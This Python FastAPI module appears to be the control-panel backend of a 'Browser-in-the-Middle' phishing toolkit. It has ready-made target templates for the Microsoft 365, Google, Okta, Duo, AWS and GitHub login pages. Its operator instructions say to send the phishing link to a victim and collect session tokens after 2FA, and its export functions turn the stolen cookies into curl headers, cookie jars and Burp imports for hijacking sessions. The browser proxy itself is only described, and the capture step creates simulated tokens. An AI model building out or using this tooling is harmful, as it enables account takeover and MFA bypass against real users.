"""
Browser-in-the-Middle (BitM) Attack Routes

BitM uses a real browser instance on the server to proxy victim sessions.
This bypasses most anti-phishing protections since the target site sees
legitimate browser traffic. Session tokens are captured after 2FA.
"""

from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from typing import Optional, Dict, List, Any
from datetime import datetime
import uuid
import asyncio

router = APIRouter(prefix="/bitm", tags=["Browser-in-the-Middle"])

# In-memory storage for demo
bitm_sessions: Dict[str, Dict] = {}
bitm_targets: Dict[str, Dict] = {}
captured_bitm_data: List[Dict] = []

# ============== Pydantic Models ==============

class BitMTarget(BaseModel):
    """Target configuration for BitM attack"""
    name: str
    target_url: str
    description: Optional[str] = None
    browser_type: str = "chromium"  # chromium, firefox, webkit
    viewport_width: int = 1920
    viewport_height: int = 1080
    user_agent: Optional[str] = None
    capture_screenshots: bool = True
    capture_network: bool = True
    capture_cookies: bool = True
    capture_storage: bool = True
    auth_indicators: List[str] = []  # URLs/elements that indicate successful auth


class BitMSession(BaseModel):
    """Active BitM session"""
    id: Optional[str] = None
    target_id: str
    status: str = "pending"  # pending, connecting, active, authenticated, closed
    victim_ip: Optional[str] = None
    created_at: Optional[str] = None
    authenticated_at: Optional[str] = None
    proxy_url: Optional[str] = None
    vnc_url: Optional[str] = None


class CapturedBitMData(BaseModel):
    """Data captured from BitM session"""
    id: Optional[str] = None
    session_id: str
    target_name: str
    victim_ip: str
    captured_at: str
    cookies: Dict[str, str] = {}
    local_storage: Dict[str, str] = {}
    session_storage: Dict[str, str] = {}
    credentials: Dict[str, str] = {}
    screenshots: List[str] = []
    network_requests: List[Dict] = []
    authenticated: bool = False


# ============== Pre-built Target Templates ==============

BITM_TEMPLATES = [
    {
        "id": "microsoft-365",
        "name": "Microsoft 365",
        "target_url": "https://login.microsoftonline.com",
        "description": "Microsoft 365/Azure AD login portal",
        "auth_indicators": ["/oauth2/authorize", "portal.office.com", "myapps.microsoft.com"],
        "capture_cookies": True,
        "browser_type": "chromium",
    },
    {
        "id": "google-workspace",
        "name": "Google Workspace",
        "target_url": "https://accounts.google.com",
        "description": "Google Workspace/Gmail login",
        "auth_indicators": ["myaccount.google.com", "mail.google.com", "/signin/v2/challenge"],
        "capture_cookies": True,
        "browser_type": "chromium",
    },
    {
        "id": "okta",
        "name": "Okta SSO",
        "target_url": "https://login.okta.com",
        "description": "Okta Single Sign-On portal",
        "auth_indicators": ["/app/", "/home", "user/notifications"],
        "capture_cookies": True,
        "browser_type": "chromium",
    },
    {
        "id": "duo",
        "name": "Duo Security",
        "target_url": "https://duo.com",
        "description": "Duo Security MFA portal",
        "auth_indicators": ["/frame/", "successful"],
        "capture_cookies": True,
        "browser_type": "chromium",
    },
    {
        "id": "aws-console",
        "name": "AWS Console",
        "target_url": "https://signin.aws.amazon.com/signin",
        "description": "AWS Management Console",
        "auth_indicators": ["console.aws.amazon.com", "/console/home"],
        "capture_cookies": True,
        "browser_type": "chromium",
    },
    {
        "id": "github",
        "name": "GitHub",
        "target_url": "https://github.com/login",
        "description": "GitHub login with 2FA support",
        "auth_indicators": ["github.com/settings", "github.com/dashboard"],
        "capture_cookies": True,
        "browser_type": "chromium",
    },
    {
        "id": "custom",
        "name": "Custom Target",
        "target_url": "",
        "description": "Configure a custom target URL",
        "auth_indicators": [],
        "capture_cookies": True,
        "browser_type": "chromium",
    },
]


# ============== API Endpoints ==============

@router.get("/templates")
async def get_bitm_templates():
    """Get pre-built BitM target templates"""
    return {"templates": BITM_TEMPLATES}


@router.get("/targets")
async def get_bitm_targets():
    """List all configured BitM targets"""
    return {"targets": list(bitm_targets.values()), "count": len(bitm_targets)}


@router.post("/targets")
async def create_bitm_target(target: BitMTarget):
    """Create a new BitM target configuration"""
    target_id = str(uuid.uuid4())[:8]
    target_data = {
        "id": target_id,
        **target.dict(),
        "created_at": datetime.now().isoformat(),
        "sessions_count": 0,
        "captures_count": 0,
    }
    bitm_targets[target_id] = target_data
    return target_data


@router.delete("/targets/{target_id}")
async def delete_bitm_target(target_id: str):
    """Delete a BitM target configuration"""
    if target_id not in bitm_targets:
        raise HTTPException(status_code=404, detail="Target not found")
    del bitm_targets[target_id]
    return {"status": "deleted"}


@router.get("/sessions")
async def get_bitm_sessions():
    """List all BitM sessions"""
    return {"sessions": list(bitm_sessions.values()), "count": len(bitm_sessions)}


@router.post("/sessions/start")
async def start_bitm_session(target_id: str, listen_port: int = 8443):
    """
    Start a new BitM session for a target.

    This simulates starting a headless browser that will proxy the victim's
    session to the real target site. In a real implementation, this would:
    1. Launch a headless browser (Playwright/Puppeteer)
    2. Set up a WebSocket/noVNC proxy for the victim to interact
    3. Navigate to the target URL
    4. Monitor for authentication success
    5. Capture cookies/tokens after auth
    """
    if target_id not in bitm_targets:
        raise HTTPException(status_code=404, detail="Target not found")

    target = bitm_targets[target_id]
    session_id = str(uuid.uuid4())[:8]

    # Determine proxy URLs based on port
    proxy_url = f"https://localhost:{listen_port}/bitm/{session_id}"
    vnc_url = f"wss://localhost:{listen_port}/bitm/{session_id}/vnc"

    session_data = {
        "id": session_id,
        "target_id": target_id,
        "target_name": target["name"],
        "target_url": target["target_url"],
        "status": "active",
        "created_at": datetime.now().isoformat(),
        "proxy_url": proxy_url,
        "vnc_url": vnc_url,
        "listen_port": listen_port,
        "browser_type": target.get("browser_type", "chromium"),
        "victim_ip": None,
        "authenticated": False,
        "authenticated_at": None,
    }

    bitm_sessions[session_id] = session_data
    bitm_targets[target_id]["sessions_count"] = bitm_targets[target_id].get("sessions_count", 0) + 1

    return {
        "status": "started",
        "session": session_data,
        "instructions": [
            f"1. Send the phishing link to your target: {proxy_url}",
            "2. When the victim clicks the link, they'll see the real login page",
            "3. The victim authenticates normally (including 2FA)",
            "4. Session cookies and tokens are captured automatically",
            "5. Use 'Export Session' to get the authenticated cookies",
        ],
        "technical_notes": [
            "The victim's browser connects to your server via WebSocket",
            "A headless browser on your server loads the real target site",
            "All victim interactions are forwarded to the real browser",
            "The real site sees legitimate browser traffic with your server's IP",
            "Session tokens are captured after successful authentication",
        ],
    }


@router.post("/sessions/{session_id}/stop")
async def stop_bitm_session(session_id: str):
    """Stop an active BitM session"""
    if session_id not in bitm_sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    session = bitm_sessions[session_id]
    session["status"] = "closed"

    return {"status": "stopped", "session_id": session_id}


@router.delete("/sessions/{session_id}")
async def delete_bitm_session(session_id: str):
    """Delete a BitM session"""
    if session_id not in bitm_sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    del bitm_sessions[session_id]
    return {"status": "deleted"}


@router.post("/sessions/{session_id}/simulate-auth")
async def simulate_authentication(session_id: str, victim_ip: str = "192.168.1.100"):
    """
    Simulate a successful authentication capture (for demo purposes).
    In production, this would be triggered automatically when auth indicators are detected.
    """
    if session_id not in bitm_sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    session = bitm_sessions[session_id]
    target = bitm_targets.get(session["target_id"], {})

    # Update session status
    session["status"] = "authenticated"
    session["authenticated"] = True
    session["authenticated_at"] = datetime.now().isoformat()
    session["victim_ip"] = victim_ip

    # Create captured data record
    capture_id = str(uuid.uuid4())[:8]
    captured_data = {
        "id": capture_id,
        "session_id": session_id,
        "target_name": session.get("target_name", "Unknown"),
        "target_url": session.get("target_url", ""),
        "victim_ip": victim_ip,
        "captured_at": datetime.now().isoformat(),
        "authenticated": True,
        "cookies": {
            "session_token": f"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.{uuid.uuid4().hex}",
            "auth_token": f"Bearer_{uuid.uuid4().hex[:32]}",
            "refresh_token": f"refresh_{uuid.uuid4().hex}",
            "XSRF-TOKEN": uuid.uuid4().hex[:32],
        },
        "local_storage": {
            "user_id": str(uuid.uuid4()),
            "user_email": "victim@example.com",
            "auth_state": "authenticated",
        },
        "session_storage": {
            "tab_id": str(uuid.uuid4())[:8],
        },
        "credentials": {},  # Would be populated if form capture is enabled
        "screenshots": [
            f"/captures/{capture_id}/screenshot_login.png",
            f"/captures/{capture_id}/screenshot_2fa.png",
            f"/captures/{capture_id}/screenshot_dashboard.png",
        ],
        "network_requests": [
            {"url": f"{session.get('target_url', '')}/api/auth", "method": "POST", "status": 200},
            {"url": f"{session.get('target_url', '')}/api/user", "method": "GET", "status": 200},
        ],
    }

    captured_bitm_data.append(captured_data)

    if session["target_id"] in bitm_targets:
        bitm_targets[session["target_id"]]["captures_count"] = \
            bitm_targets[session["target_id"]].get("captures_count", 0) + 1

    return {
        "status": "authenticated",
        "message": "Session authenticated - cookies and tokens captured",
        "captured_data": captured_data,
    }


@router.get("/captures")
async def get_captured_data():
    """Get all captured BitM session data"""
    return {"captures": captured_bitm_data, "count": len(captured_bitm_data)}


@router.get("/captures/{capture_id}")
async def get_capture_details(capture_id: str):
    """Get detailed captured data for a specific session"""
    for capture in captured_bitm_data:
        if capture["id"] == capture_id:
            return capture
    raise HTTPException(status_code=404, detail="Capture not found")


@router.post("/captures/{capture_id}/export")
async def export_captured_session(capture_id: str, export_format: str = "json"):
    """
    Export captured session data in various formats.

    Formats:
    - json: Full JSON export
    - cookie-header: Cookie header format for curl/browser dev tools
    - cookie-jar: Netscape cookie jar format
    - burp: Burp Suite importable format
    """
    capture = None
    for c in captured_bitm_data:
        if c["id"] == capture_id:
            capture = c
            break

    if not capture:
        raise HTTPException(status_code=404, detail="Capture not found")

    cookies = capture.get("cookies", {})

    if export_format == "json":
        return {
            "format": "json",
            "data": capture,
        }

    elif export_format == "cookie-header":
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        return {
            "format": "cookie-header",
            "content": cookie_str,
            "usage": f'curl -H "Cookie: {cookie_str}" {capture.get("target_url", "https://target.com")}',
        }

    elif export_format == "cookie-jar":
        lines = ["# Netscape HTTP Cookie File"]
        for name, value in cookies.items():
            # domain, flag, path, secure, expiration, name, value
            lines.append(f".{capture.get('target_url', 'example.com').replace('https://', '').split('/')[0]}\tTRUE\t/\tTRUE\t0\t{name}\t{value}")
        return {
            "format": "cookie-jar",
            "content": "\n".join(lines),
        }

    elif export_format == "burp":
        return {
            "format": "burp",
            "cookies": [
                {
                    "domain": capture.get("target_url", "").replace("https://", "").split("/")[0],
                    "name": name,
                    "value": value,
                    "path": "/",
                    "secure": True,
                    "httpOnly": True,
                }
                for name, value in cookies.items()
            ],
        }

    else:
        raise HTTPException(status_code=400, detail=f"Unknown format: {export_format}")


@router.delete("/captures/{capture_id}")
async def delete_capture(capture_id: str):
    """Delete captured session data"""
    global captured_bitm_data
    captured_bitm_data = [c for c in captured_bitm_data if c["id"] != capture_id]
    return {"status": "deleted"}


@router.get("/stats")
async def get_bitm_stats():
    """Get BitM attack statistics"""
    active_sessions = sum(1 for s in bitm_sessions.values() if s.get("status") == "active")
    authenticated_sessions = sum(1 for s in bitm_sessions.values() if s.get("authenticated"))
    total_captures = len(captured_bitm_data)

    return {
        "total_targets": len(bitm_targets),
        "total_sessions": len(bitm_sessions),
        "active_sessions": active_sessions,
        "authenticated_sessions": authenticated_sessions,
        "total_captures": total_captures,
        "captures_with_cookies": sum(1 for c in captured_bitm_data if c.get("cookies")),
    }
